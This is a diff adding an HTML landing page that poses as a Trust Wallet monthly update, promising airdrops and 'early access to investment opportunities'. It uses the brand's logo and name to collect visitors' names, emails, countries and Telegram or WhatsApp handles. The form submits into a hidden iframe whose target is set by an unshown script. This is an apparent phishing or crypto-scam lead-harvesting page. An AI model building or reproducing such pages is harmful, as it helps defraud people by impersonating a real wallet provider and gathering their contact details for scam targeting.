@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Your Key to the World of Crypto</title>
+  <link rel="stylesheet" href="styles.css" />
+  <meta name="description" content="Monthly update — Trust Wallet style. Learn about Bitcoin Layer-2, airdrops and early access opportunities. Securely sign up for updates." />
+</head>
+<body>
+  <header class="site-header">
+    <div class="container header-inner">
+      <img src="assets/trustwallet-logo.png" alt="Trust Wallet logo" class="logo" />
+      <div class="brand">
+        <h1>Your Key to the World of Crypto</h1>
+        <p class="tag">Monthly update • Token drops • Airdrops • Investment opportunities</p>
+      </div>
+    </div>
+  </header>
+
+  <main class="container main-content" id="main">
+    <section class="hero">
+      <h2>Welcome to your monthly update from Trust Wallet</h2>
+      <p class="lead">The simplest and most secure way to store, send, and manage your crypto and digital assets. 🚀</p>
+    </section>
+
+    <section class="update-card">
+      <h3>What’s New 🚀</h3>
+
+      <article class="feature">
+        <h4>🚀 New Token Integration: Bitcoin Layer‑2 Growth</h4>
+        <p>
+          We’re excited to announce support for Bitcoin Layer‑2 protocols, including BRC‑20 tokens.
+          These tokens are built on Bitcoin, unlocking DeFi, NFTs, and new smart‑contract–like possibilities.
+        </p>
+      </article>
+
+      <article class="feature">
+        <h4>📈 The Rise of Airdrops</h4>
+        <p>
+          Crypto airdrops are one of the fastest-growing trends in Web3. They reward early adopters and active users with free tokens.
+          Early participants in projects like Uniswap, Optimism, and Arbitrum saw large gains — airdrops can be opportunities.
+        </p>
+      </article>
+
+      <article class="feature">
+        <h4>💡 How You Can Benefit</h4>
+        <ol>
+          <li><strong>Stay Active</strong> – Interact with dApps, stake, and explore new ecosystems.</li>
+          <li><strong>Hold Tokens Securely</strong> – Loyal holders are often rewarded.</li>
+          <li><strong>Keep Your Wallet Updated</strong> – We integrate new token support so you don’t miss opportunities.</li>
+        </ol>
+      </article>
+
+      <div class="cta">
+        <p><strong>Want early access to token drops & investment opportunities?</strong></p>
+        <p>Fill your details securely below.</p>
+      </div>
+    </section>
+
+    <section class="form-section" aria-labelledby="form-heading">
+      <h3 id="form-heading">Secure Sign Up</h3>
+
+      <!-- action set by script.js but we include the target iframe so the page doesn't navigate -->
+      <form id="signup-form" class="signup-form" method="POST" action="#" target="hidden_iframe" novalidate>
+        <label for="fullName">Full name</label>
+        <input id="fullName" name="fullName" type="text" placeholder="Jane Doe" required />
+
+        <label for="email">Email</label>
+        <input id="email" name="email" type="email" placeholder="jane@example.com" required />
+
+        <label for="country">Country</label>
+        <input id="country" name="country" type="text" placeholder="Nigeria / USA / India" required />
+
+        <label for="contact">Telegram or WhatsApp / Twitter</label>
+        <input id="contact" name="contact" type="text" placeholder="@janedoe or +1234567890" required />
+
+        <label class="checkbox">
+          <input id="consent" name="consent" type="checkbox" required />
+          By submitting, I agree to receive updates about token launches, airdrops and investment opportunities. I understand crypto investing is risky and I may unsubscribe any time. I will never provide my seed phrase or private keys to anyone.
+        </label>
+
+        <div class="form-actions">
+          <button id="submitBtn" type="submit" class="btn primary">Submit & Get Early Access</button>
+          <div id="loader" class="loader hidden" aria-hidden="true"></div>
+        </div>
+
+        <div id="formMessage" class="form-message" role="status" aria-live="polite"></div>
+      </form>
+
+      <p class="privacy-note">We respect your privacy. Your data will be used only to send updates about token drops and investment opportunities.</p>
+    </section>
+
+    <footer class="page-footer">
+      <p>© <span id="year"></span> Your Company — Built with security and trust in mind.</p>
+    </footer>
+  </main>
+
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+  <script src="script.js"></script>
+</body>
+</html>
